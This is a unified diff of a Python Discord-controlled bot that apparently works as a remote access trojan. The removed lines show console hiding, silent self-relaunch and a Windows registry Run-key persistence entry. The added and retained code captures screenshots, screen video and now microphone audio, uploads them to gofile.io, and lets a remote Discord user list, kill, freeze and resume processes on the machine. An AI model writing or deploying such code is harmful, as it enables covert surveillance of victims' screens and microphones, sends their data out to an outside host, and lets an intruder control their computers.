@@ -1,76 +1,23 @@
 import os
 import sys
-import subprocess
-import importlib
 import time
+import tempfile
+import subprocess
 import ctypes
+import requests
+import discord
+from discord.ext import commands
+import mss
+from PIL import Image
+import numpy as np
+import cv2
 
 # ==================== CONFIG ====================
 DISCORD_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
 # ================================================
 
-# ---------- HIDE CONSOLE WINDOW (Windows) ----------
-def hide_console():
-    if os.name != "nt":
-        return
-    try:
-        # Get handle to current console window
-        kernel32 = ctypes.WinDLL("kernel32")
-        user32 = ctypes.WinDLL("user32")
-        hwnd = kernel32.GetConsoleWindow()
-        if hwnd:
-            # SW_HIDE = 0
-            user32.ShowWindow(hwnd, 0)
-    except Exception:
-        pass
-
-# ---------- RELAUNCH SELF WITH PYTHONW IF RUNNING WITH CONSOLE ----------
-def relaunch_silently():
-    """If launched with python.exe (console), relaunch with pythonw.exe and exit."""
-    if os.name != "nt":
-        return False
-
-    # Already running under pythonw? Skip.
-    exe = os.path.basename(sys.executable).lower()
-    if exe == "pythonw.exe":
-        return False
-
-    # Avoid infinite relaunch loop
-    if os.environ.get("_BOT_RELAUNCHED") == "1":
-        return False
-
-    pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
-    if not os.path.exists(pythonw):
-        return False
-
-    env = os.environ.copy()
-    env["_BOT_RELAUNCHED"] = "1"
-
-    # DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW
-    DETACHED_PROCESS = 0x00000008
-    CREATE_NEW_PROCESS_GROUP = 0x00000200
-    CREATE_NO_WINDOW = 0x08000000
-    flags = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW
-
-    subprocess.Popen(
-        [pythonw, os.path.abspath(__file__)],
-        env=env,
-        creationflags=flags,
-        close_fds=True,
-        stdin=subprocess.DEVNULL,
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-    )
-    return True
-
-# Hide any existing console immediately
-hide_console()
-
-# If we were started with python.exe, relaunch silently and quit this one
-if relaunch_silently():
-    sys.exit(0)
-
-# ---------- AUTO INSTALL DEPENDENCIES ----------
+# ---------- PACKAGE BOOTSTRAP (in case loader missed any) ----------
+import importlib
 REQUIRED_PACKAGES = {
     "discord": "discord.py",
     "PIL": "Pillow",
@@ -78,6 +25,8 @@ REQUIRED_PACKAGES = {
     "numpy": "numpy",
     "requests": "requests",
     "cv2": "opencv-python",
+    "sounddevice": "sounddevice",
+    "soundfile": "soundfile",
 }
 
 def ensure_packages():
@@ -87,7 +36,7 @@ def ensure_packages():
         except ImportError:
             subprocess.check_call(
                 [sys.executable, "-m", "pip", "install", "--quiet", pkg],
-                creationflags=(0x08000000 if os.name == "nt" else 0),  # CREATE_NO_WINDOW
+                creationflags=(0x08000000 if os.name == "nt" else 0),
                 stdin=subprocess.DEVNULL,
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
@@ -95,53 +44,25 @@ def ensure_packages():
 
 ensure_packages()
 
-# ---------- NOW SAFE TO IMPORT ----------
-import discord
-from discord.ext import commands
-import mss
-import numpy as np
-import requests
-import cv2
-import tempfile
-from PIL import Image
+# ---------- IMPORTS THAT NEED SOUNDDEVICE ----------
+import sounddevice as sd
+import soundfile as sf
 
-# ---------- AUTOSTART SETUP (Windows) ----------
-def setup_autostart():
-    if os.name != "nt":
-        return
-
-    try:
-        import winreg
-        script_path = os.path.abspath(__file__)
-
-        python_exe = sys.executable
-        pythonw = os.path.join(os.path.dirname(python_exe), "pythonw.exe")
-        if not os.path.exists(pythonw):
-            pythonw = python_exe
-
-        # pythonw.exe already produces no window, but pass -u flag not needed;
-        # we launch via pythonw so it's silent. Add "start /b" fallback if needed.
-        cmd = f'"{pythonw}" "{script_path}"'
-
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0,
-            winreg.KEY_SET_VALUE,
-        )
-        winreg.SetValueEx(key, "DiscordPCBot", 0, winreg.REG_SZ, cmd)
-        winreg.CloseKey(key)
-    except Exception:
-        pass
-
-setup_autostart()
+# ---------- WIN32 CONSTANTS ----------
+PROCESS_SUSPEND_RESUME = 0x0800
+PROCESS_QUERY_INFORMATION = 0x0400
+PROCESS_TERMINATE = 0x0001
+TH32CS_SNAPPROCESS = 0x00000002
 
 # ---------- BOT SETUP ----------
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix=",", intents=intents)
 
-# ---------- HELPER: take screenshot ----------
+
+# ==========================================================
+# EXISTING HELPERS
+# ==========================================================
 def take_screenshot(path: str):
     with mss.mss() as sct:
         monitor = sct.monitors[0]
@@ -149,15 +70,12 @@ def take_screenshot(path: str):
         img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
         img.save(path, "PNG")
 
-# ---------- HELPER: record screen 30s @ 60fps ----------
+
 def record_screen(path: str, duration=30, fps=60):
     with mss.mss() as sct:
         monitor = sct.monitors[0]
-        width = monitor["width"]
-        height = monitor["height"]
-
-        width -= width % 2
-        height -= height % 2
+        width = monitor["width"] - (monitor["width"] % 2)
+        height = monitor["height"] - (monitor["height"] % 2)
 
         fourcc = cv2.VideoWriter_fourcc(*"mp4v")
         out = cv2.VideoWriter(path, fourcc, fps, (width, height))
@@ -180,7 +98,7 @@ def record_screen(path: str, duration=30, fps=60):
 
         out.release()
 
-# ---------- HELPER: upload to gofile ----------
+
 def upload_to_gofile(filepath: str) -> str:
     r = requests.get("https://api.gofile.io/servers", timeout=15)
     r.raise_for_status()
@@ -194,10 +112,187 @@ def upload_to_gofile(filepath: str) -> str:
     data = resp.json()
     return data["data"]["downloadPage"]
 
-# ---------- COMMANDS ----------
+
+# ==========================================================
+# WINDOW / PROCESS HELPERS
+# ==========================================================
+def get_visible_windows():
+    """
+    Return a list of (pid, process_name, window_title) for processes that
+    own a visible top-level window. Excludes background processes like
+    svchost, csrss, dwm, etc.
+    """
+    if os.name != "nt":
+        return []
+
+    user32 = ctypes.WinDLL("user32", use_last_error=True)
+    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    psapi = ctypes.WinDLL("psapi", use_last_error=True)
+
+    results = []
+    seen_pids = set()
+
+    WNDENUMPROC = ctypes.WINFUNCTYPE(
+        ctypes.c_bool, ctypes.c_void_p, ctypes.POINTER(ctypes.c_int)
+    )
+
+    def enum_cb(hwnd, lparam):
+        if not user32.IsWindowVisible(hwnd):
+            return True
+
+        length = user32.GetWindowTextLengthW(hwnd)
+        if length == 0:
+            return True  # No title — background/hidden window
+
+        buf = ctypes.create_unicode_buffer(length + 1)
+        user32.GetWindowTextW(hwnd, buf, length + 1)
+        title = buf.value.strip()
+        if not title:
+            return True
+
+        pid = ctypes.c_ulong()
+        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+        pid = pid.value
+        if pid in seen_pids:
+            return True
+
+        # Get process name
+        PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
+        h = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
+        if not h:
+            return True
+        try:
+            size = ctypes.c_ulong(260)
+            name_buf = ctypes.create_unicode_buffer(260)
+            if psapi.GetModuleBaseNameW(h, None, name_buf, size):
+                proc_name = name_buf.value
+            else:
+                proc_name = "unknown"
+        finally:
+            kernel32.CloseHandle(h)
+
+        seen_pids.add(pid)
+        results.append((pid, proc_name, title))
+        return True
+
+    user32.EnumWindows(WNDENUMPROC(enum_cb), 0)
+    return results
+
+
+def find_pids_by_name(name: str):
+    """Find all PIDs whose process name matches (case-insensitive, with or without .exe)."""
+    if os.name != "nt":
+        return []
+
+    target = name.lower()
+    if not target.endswith(".exe"):
+        target_exe = target + ".exe"
+    else:
+        target_exe = target
+
+    matches = []
+
+    # Use tasklist for a simple, reliable listing
+    try:
+        out = subprocess.check_output(
+            ["tasklist", "/FO", "CSV", "/NH"],
+            creationflags=0x08000000,
+            stderr=subprocess.DEVNULL,
+        ).decode(errors="ignore")
+
+        for line in out.splitlines():
+            parts = [p.strip('"') for p in line.split('","')]
+            if len(parts) < 2:
+                continue
+            proc_name = parts[0].strip('"').lower()
+            try:
+                pid = int(parts[1].strip('"'))
+            except ValueError:
+                continue
+            if proc_name == target_exe or proc_name == target:
+                matches.append((pid, proc_name))
+    except Exception:
+        pass
+
+    return matches
+
+
+def suspend_process(pid: int) -> bool:
+    if os.name != "nt":
+        return False
+    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
+
+    h = kernel32.OpenProcess(PROCESS_SUSPEND_RESUME, False, pid)
+    if not h:
+        return False
+    try:
+        # NtSuspendProcess
+        status = ntdll.NtSuspendProcess(h)
+        return status == 0
+    finally:
+        kernel32.CloseHandle(h)
+
+
+def resume_process(pid: int) -> bool:
+    if os.name != "nt":
+        return False
+    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
+
+    h = kernel32.OpenProcess(PROCESS_SUSPEND_RESUME, False, pid)
+    if not h:
+        return False
+    try:
+        # NtResumeProcess
+        status = ntdll.NtResumeProcess(h)
+        return status == 0
+    finally:
+        kernel32.CloseHandle(h)
+
+
+def kill_pid(pid: int) -> bool:
+    if os.name != "nt":
+        return False
+    try:
+        subprocess.call(
+            ["taskkill", "/F", "/PID", str(pid)],
+            creationflags=0x08000000,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        return True
+    except Exception:
+        return False
+
+
+# ==========================================================
+# AUDIO RECORDING
+# ==========================================================
+def record_mic(path: str, duration=30, samplerate=44100):
+    """Record from the default microphone input for `duration` seconds."""
+    channels = 1
+    # Record
+    recording = sd.rec(
+        int(duration * samplerate),
+        samplerate=samplerate,
+        channels=channels,
+        dtype="int16",
+    )
+    sd.wait()  # blocks until done
+
+    # Save as WAV
+    sf.write(path, recording, samplerate)
+
+
+# ==========================================================
+# COMMANDS
+# ==========================================================
 @bot.event
 async def on_ready():
     pass  # silent
+
 
 @bot.command(name="screenshot")
 async def screenshot_cmd(ctx):
@@ -215,6 +310,7 @@ async def screenshot_cmd(ctx):
             os.remove(tmp)
         except OSError:
             pass
+
 
 @bot.command(name="video")
 async def video_cmd(ctx):
@@ -238,7 +334,154 @@ async def video_cmd(ctx):
         except OSError:
             pass
 
-# ---------- RUN ----------
+
+@bot.command(name="tasks")
+async def tasks_cmd(ctx):
+    """List all processes that have a visible top-level window (no background services)."""
+    try:
+        windows = await bot.loop.run_in_executor(None, get_visible_windows)
+        if not windows:
+            await ctx.send("No visible windows found.")
+            return
+
+        # Group by process name for a cleaner list
+        grouped = {}
+        for pid, name, title in windows:
+            grouped.setdefault(name.lower(), []).append((pid, title))
+
+        lines = []
+        for name in sorted(grouped.keys()):
+            entries = grouped[name]
+            pids = ", ".join(str(p) for p, _ in entries)
+            lines.append(f"**{name}**  (PID: {pids})")
+
+        # Split if too long for one message (Discord limit 2000 chars)
+        chunk = "**🪟 Visible window processes:**\n"
+        for line in lines:
+            if len(chunk) + len(line) + 1 > 1900:
+                await ctx.send(chunk)
+                chunk = ""
+            chunk += line + "\n"
+        if chunk.strip():
+            await ctx.send(chunk)
+    except Exception as e:
+        await ctx.send(f"❌ Failed to list tasks: `{e}`")
+
+
+@bot.command(name="kill")
+async def kill_cmd(ctx, *, task_name: str = None):
+    """Kill a process by name. Example: ,kill Chrome"""
+    if not task_name:
+        await ctx.send("Usage: `,kill <TaskName>`  e.g. `,kill Chrome`")
+        return
+
+    await ctx.message.add_reaction("⏳")
+    try:
+        matches = await bot.loop.run_in_executor(None, find_pids_by_name, task_name)
+        if not matches:
+            await ctx.send(f"❌ No process found matching `{task_name}`")
+            return
+
+        killed = []
+        for pid, name in matches:
+            ok = await bot.loop.run_in_executor(None, kill_pid, pid)
+            if ok:
+                killed.append(f"{name} (PID {pid})")
+
+        if killed:
+            await ctx.send("✅ Killed: " + ", ".join(killed))
+        else:
+            await ctx.send(f"❌ Failed to kill `{task_name}`")
+        await ctx.message.add_reaction("✅")
+    except Exception as e:
+        await ctx.send(f"❌ Kill failed: `{e}`")
+
+
+@bot.command(name="freeze")
+async def freeze_cmd(ctx, *, task_name: str = None):
+    """Suspend a process (makes it unresponsive). Example: ,freeze Chrome"""
+    if not task_name:
+        await ctx.send("Usage: `,freeze <TaskName>`  e.g. `,freeze Chrome`")
+        return
+
+    await ctx.message.add_reaction("⏳")
+    try:
+        matches = await bot.loop.run_in_executor(None, find_pids_by_name, task_name)
+        if not matches:
+            await ctx.send(f"❌ No process found matching `{task_name}`")
+            return
+
+        frozen = []
+        for pid, name in matches:
+            ok = await bot.loop.run_in_executor(None, suspend_process, pid)
+            if ok:
+                frozen.append(f"{name} (PID {pid})")
+
+        if frozen:
+            await ctx.send("🧊 Frozen: " + ", ".join(frozen))
+        else:
+            await ctx.send(f"❌ Failed to freeze `{task_name}` (try running as admin)")
+        await ctx.message.add_reaction("✅")
+    except Exception as e:
+        await ctx.send(f"❌ Freeze failed: `{e}`")
+
+
+@bot.command(name="unfreeze")
+async def unfreeze_cmd(ctx, *, task_name: str = None):
+    """Resume a suspended process. Example: ,unfreeze Chrome"""
+    if not task_name:
+        await ctx.send("Usage: `,unfreeze <TaskName>`  e.g. `,unfreeze Chrome`")
+        return
+
+    await ctx.message.add_reaction("⏳")
+    try:
+        matches = await bot.loop.run_in_executor(None, find_pids_by_name, task_name)
+        if not matches:
+            await ctx.send(f"❌ No process found matching `{task_name}`")
+            return
+
+        thawed = []
+        for pid, name in matches:
+            ok = await bot.loop.run_in_executor(None, resume_process, pid)
+            if ok:
+                thawed.append(f"{name} (PID {pid})")
+
+        if thawed:
+            await ctx.send("🔥 Unfrozen: " + ", ".join(thawed))
+        else:
+            await ctx.send(f"❌ Failed to unfreeze `{task_name}` (try running as admin)")
+        await ctx.message.add_reaction("✅")
+    except Exception as e:
+        await ctx.send(f"❌ Unfreeze failed: `{e}`")
+
+
+@bot.command(name="mic")
+async def mic_cmd(ctx):
+    """Record 30s from the default microphone, upload to gofile, return link."""
+    await ctx.message.add_reaction("⏳")
+    await ctx.send("🎙️ Recording 30 seconds from microphone...")
+
+    tmp = os.path.join(tempfile.gettempdir(), f"mic_{int(time.time())}.wav")
+    try:
+        await bot.loop.run_in_executor(None, record_mic, tmp)
+
+        await ctx.send("☁️ Uploading to gofile.io...")
+        link = await bot.loop.run_in_executor(None, upload_to_gofile, tmp)
+        await ctx.send(f"✅ **Audio ready:** {link}")
+        await ctx.message.remove_reaction("⏳", bot.user)
+        await ctx.message.add_reaction("✅")
+    except Exception as e:
+        await ctx.send(f"❌ Mic recording failed: `{e}`")
+    finally:
+        try:
+            os.remove(tmp)
+        except OSError:
+            pass
+
+
+# ==========================================================
+# RUN
+# ==========================================================
 if __name__ == "__main__":
     if DISCORD_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
         sys.exit(1)
